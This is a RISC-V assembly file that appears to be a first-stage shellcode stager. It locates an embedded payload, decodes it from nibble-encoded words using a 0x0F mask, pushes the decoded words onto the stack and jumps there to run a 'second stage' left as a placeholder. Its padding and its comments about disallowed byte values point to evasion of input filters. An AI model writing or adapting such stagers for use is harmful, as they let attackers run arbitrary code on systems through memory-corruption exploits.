
	.globl	_start
	
	.text
_start:
# get payload address into s0
	auipc	s0, 0x7e7e1
#	c.and	a5, a0
	lui	a6, 0x8181e
	add	s2, s0, a6
	sub	s0, s2, x0
        addi    s0, s0, 0x7f7
        addi    s0, s0, 0x7f7
#The 8-bit is not allowed in set of addi
#Current Total: 162
        addi    s0, s0, 54
	addi	s0, s0, 54
	addi	s0, s0, 54

# Temp to deal with stupidity
	c.li	a6, 0x3
	c.li    a6, 0x3
	c.li    a6, 0x3
	c.li    a6, 0x3

# load 8 bytes of 0x0F into a7
#	addi	a4, s4, -1158
	c.and 	a5, a0
	xor	a7, s6, s6
	c.li	a6, 0x0F
	c.add	a7, a6

	c.mv	t6, s8
	c.slli	a7, 8
	c.add	a7, a6

	xor 	a6, s6, s6
	or	a6, a6, a7
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.add	a7, a6

	c.mv	a6, a7
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.mv	t6, s8
	c.slli	a7, 8
	c.add 	a7, a6

# get count into s1
	c.ld	s1, 0(s0)
	c.ld	a5, 8(s0)
	c.addi	s0, 16
	and	s1, s1, a7
	and	a5, a5, a7
	c.slli	a5, 4
	c.add	s1, a5

0:
# get word to write into a0
	c.ld	a0, 0(s0)
	c.ld	a1, 8(s0)
	c.addi	s0, 16

	and	a0, a0, a7
	and	a1, a1, a7
	c.slli	a1, 4
	c.add	a0, a1

# store a0 on the stack
	c.addi	sp, -8
	c.sdsp	a0, 0(sp)
# loop
	c.addi	s1, -1
	c.bnez	s1, 0b
## jump to stage 2
	c.jr	sp
	.data
payload:
# SECOND STAGE SUBSTITUTED HERE
